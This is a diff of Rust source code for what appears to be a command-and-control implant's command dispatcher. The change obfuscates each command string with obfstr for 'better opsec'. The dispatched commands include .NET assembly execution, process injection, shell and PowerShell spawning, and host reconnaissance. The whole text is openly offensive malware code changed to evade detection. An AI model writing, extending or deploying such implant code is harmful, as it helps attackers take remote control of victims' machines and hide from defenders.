@@ -109,21 +109,21 @@ fn link_command(command: String) -> String {
     // DEBUG AGENT
     let arg_split = command.as_str().split(' ');
     let args = arg_split.collect::<Vec<&str>>();
-    // the args should all be changed for better opsec
+    // obfsscated args
     match args[0] {
-        "execute-assembly"  => nonstd::execute_assembly(args),
-        "inject"            => nonstd::process_injection(args),
-        "cmd"               => command_spawn(args),
-        "shell"             => shell(args),
-        "powershell"        => powershell(args),
-        "cd"                => cd(args),
-        "pwd"               => pwd(),
-        "ls"                => ls(args),
-        "pid"               => pid().to_string(),
-        "whoami"            => String::from(format!("{}\\{}", hostname(), username())),
-        "integrity"         => integrity(),
-        "exit"              => return "exit".to_string(),
-        _                   => String::from(format!("not a command")),
+        a if (a == obfstr::obfstr!("execute-assembly")) => nonstd::execute_assembly(args),
+        a if (a == obfstr::obfstr!("inject")) => nonstd::process_injection(args),
+        a if (a == obfstr::obfstr!("cmd")) => command_spawn(args),
+        a if (a == obfstr::obfstr!("shell")) => shell(args),
+        a if (a == obfstr::obfstr!("powershell")) => powershell(args),
+        a if (a == obfstr::obfstr!("cd")) => cd(args),
+        a if (a == obfstr::obfstr!("pwd")) => pwd(),
+        a if (a == obfstr::obfstr!("ls")) => ls(args),
+        a if (a == obfstr::obfstr!("pid")) => pid().to_string(),
+        a if (a == obfstr::obfstr!("whoami")) => String::from(format!("{}\\{}", hostname(), username())),
+        a if (a == obfstr::obfstr!("integrity")) => integrity(),
+        a if (a == obfstr::obfstr!("exit")) => return "exit".to_string(),
+        _ => String::from(format!("not a command")),
     }
 }
 
